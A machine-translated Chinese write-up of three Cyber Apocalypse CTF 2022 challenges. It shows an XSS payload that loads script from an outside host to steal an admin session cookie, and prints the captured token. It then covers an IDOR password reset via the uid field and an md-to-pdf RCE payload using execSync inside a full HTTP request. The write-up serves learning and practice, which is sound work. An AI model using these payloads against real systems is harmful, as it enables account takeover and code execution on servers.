# 网络启示录 CTF 2022——星际追逐报道

> 原文：<https://infosecwriteups.com/cyber-apocalypse-ctf-2022-intergalactic-chase-write-up-6d2e89b1633e?source=collection_archive---------1----------------------->

![](img/c6142e83e18dbf5f52b0e176d01606da.png)

[https://CTF . hackthebox . com/static/ca/cyber _ 启示录 _2022_ca.jpg](https://ctf.hackthebox.com/static/ca/cyber_apocalypse_2022_ca.jpg)

大家好，我是 **Hac** ，今天我们要做的是 2022 年 CTF 网络启示录，特别是这些挑战

```
**- Kryptos Support (Web)
- BlinkerFluids  (web)
- Compressor (Misc)**
```

我们将首先从**氪星支持(Web)开始。**我们走吧 **………**

![](img/71935a75474d1a9c5a7b1bed98718a38.png)

在访问该页面时，我们看到有一个输入字段，我们可以在那里输入一些内容，然后由管理员检查(这就像一个报告系统，我们的报告将由管理员用户或其他用户组检查)。

![](img/c471dc2c170dd6c2045a3cffef2aeecc.png)

我想知道我能做些什么，我已经玩了很多 CTF 的(仍然是一个新手)，所以我想试试 XSS，但不是你的传统警报(1)，因为事情没有在我们这边发生，我们需要知道我们的有效载荷是否工作。这就是为什么我使用 [XSShunter](https://xsshunter.com/) 有其他方法来做这项工作，但我将坚持使用 [XSShunter](https://xsshunter.com/) 。这是我们的有效载荷🢃

```
"><script src=[https://](https://hac10101.xss.ht)someone-in-somewhere-redacted.com></script>
```

![](img/16e468289feb4c17d06aabbc18607a4e.png)

我们的 XSS 有效载荷爆炸了，我在想我在这里能做什么？对我来说很有趣的一件事是我们可以吃到饼干。该用户可能是管理员或具有相同或稍低权限的其他用户。

因为我们身边没有饼干，所以我对饼干很感兴趣。

![](img/9846d351f1359b364276646b6fcc42ad.png)

```
##### Cookies (Non-HTTPOnly)
`session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI1MzQ4ODV9.JO12yEA44QxXgfUmL3n6Sm4Et2AJc5rkvXkvSMdmFOI`
```

现在我们可以在浏览器中添加这个 cookie 了。

![](img/e390d3c5fa739eb37e6222e8bda4a38d.png)

添加 cookie

之后，我们将导航到/tickets(感谢我出色的团队成员 [**KDirectorate**](https://twitter.com/KDirectorate) )。

![](img/411b218d9adc0b20a8affcee925c2ec7.png)

我想知道我能在这里做什么，这个页面似乎是静态的(除了一些东西)。我试了/RFID/一些号码，但都不成功

![](img/d9990220ca1ce91b9c314419323bc70e.png)![](img/97088e4fb3d23753e086dcca7c16c75d.png)

然后我的一个队友( [**KDirectorate**](https://twitter.com/KDirectorate) )对“检查/设置哪个有密码重置功能”说，真的很有意思。我导航到/setting 并截取了 burp suite 中的响应。

![](img/4c4b03e4845e5a7d930481c532b7c7cc.png)

一个是“密码”，另一个是“uid”(就像用户名)。

![](img/d21bc956bd23e0319029c47fb24d66df.png)![](img/a2897b94f42d8d12652d4183b5542eed.png)

然后我想如果我把 **uid** 的值改成 1 呢？(大多数情况下 1 =管理员)

![](img/5a00d2a37eadd5d35e986e3afd6f2074.png)![](img/18cd50a3b5a9d29b386efc719a77d733.png)

然后我就可以修改管理员的密码了。之后，我尝试以管理员身份登录，并成功了。

![](img/b8b57440b7b81fe1e5a2bafe0e462f16.png)![](img/0b55fb0e37720672a2dd2c2554856c2b.png)

# **BlinkerFluids(卷筒纸)**

在这个挑战中， **md-to-pdf** 中有一个 **RCE** ，我们将使用它来获取标志(感谢[**k Directorate**](https://twitter.com/KDirectorate)**)**如果我们检查挑战文件，我们将遇到🢃

```
'--no-sandbox', '--js-flags=--noexpose_wasm,--jitless
```

![](img/8588f48e50d2ebd1fddebb9beddf07e0.png)

这里没有“—没有沙箱”意味着我们可以访问主机环境。

我用来了解这种利用的一些资源

 [## 远程代码执行(RCE)MD-to-pdf | CVE-2021-23639 | Snyk

### 您的应用程序使用这个易受攻击的包吗？只需点击几下鼠标，我们就可以分析您的整个应用程序，并了解…

security.snyk.io](https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880) [](https://github.com/simonhaenisch/md-to-pdf/issues/99) [## 安全性:灰质暴露了导致任意代码执行问题的前端问题 JS-engine…

### 此时您不能执行该操作。您已使用另一个标签页或窗口登录。您已在另一个选项卡中注销，或者…

github.com](https://github.com/simonhaenisch/md-to-pdf/issues/99) 

因此，我们将在 burp suite 中截取响应，我将添加我的有效载荷。

```
---js\n((require('child_process')).execSync('id > /tmp/RCE.txt'))\n---RCE
```

![](img/87a99dcf495777bec341c09332819bbc.png)![](img/fff908aea1c0249435e0330c03067a0e.png)

我们能够执行我们的代码

```
POST /api/invoice/add HTTP/1.1
Host: 46.101.27.51:32374
Content-Length: 24
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: [http://46.101.27.51:32374](http://46.101.27.51:32374)
Referer: [http://46.101.27.51:32374/](http://46.101.27.51:32374/)
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close{"markdown_content":"---js\n((require('child_process')).execSync('ls > static/RCE.txt'))\n---RCE"}
```

我们可以通过简单的枚举来获得标志。

**压缩机(杂项)**

在这个挑战中，我们将利用命令注入来获取 flag。

![](img/b7407711125ca4a4dce4b29e8b5d9d97.png)

这个很简单，所以我会很快完成

![](img/4f2f629477ea6de67c731b64a77856f6.png)![](img/7a0bf4a0c505c1acaf4b64090612682d.png)

我们能够执行不同的命令，通过简单的枚举，我们可以找到标志。